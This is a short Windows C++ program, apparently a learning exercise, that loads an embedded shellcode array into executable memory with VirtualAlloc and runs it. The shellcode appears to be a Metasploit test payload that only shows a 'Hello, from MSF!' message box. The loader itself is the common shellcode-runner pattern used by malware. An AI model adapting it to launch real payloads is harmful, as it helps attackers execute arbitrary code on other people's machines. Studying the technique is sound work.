// Create_Thread_CPP.cpp : Este arquivo contém a função 'main'. A execução do programa começa e termina ali.
//

#include <iostream>
#include <windows.h>

int main()
{
    unsigned char buf[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
        "\x04\xbb\xef\xce\xe0\x60\x87\x1c\x24\x52\xe8\x8e\xff\xff"
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
        "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
        "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
        "\x52\xe8\x5f\xff\xff\xff\x68\x61\x72\x65\x58\x68\x4d\x61"
        "\x6c\x77\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68\x58\x20\x20"
        "\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c"
        "\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89"
        "\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55"
        "\x08";


    // Shellcode Allocation
    void* allocatedFunctionAddress = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // Check for erros in the allocation proccess
    if (allocatedFunctionAddress == NULL) {
        DWORD error = GetLastError();
        std::cerr << "VirtualAlloc failed with error code: " << error << std::endl;
        return 1;
    }
    std::cout << "Allocated Address at 0x" << allocatedFunctionAddress << std::endl;

    // Copy the content of buf to the new address
    memcpy(allocatedFunctionAddress, buf, sizeof buf);
    std::cout << "Copied Shellcode!" << std::endl;
    std::cout << "Executing Shellcode..." << std::endl;

    // Create a type for our shellcode function, we'll expect a int to return
    typedef void (*BufFunction)();
    // Convert to function pointer
    BufFunction bufF = reinterpret_cast<BufFunction>(allocatedFunctionAddress);
    // Call the function and print the result
    bufF();

    return 0;
}
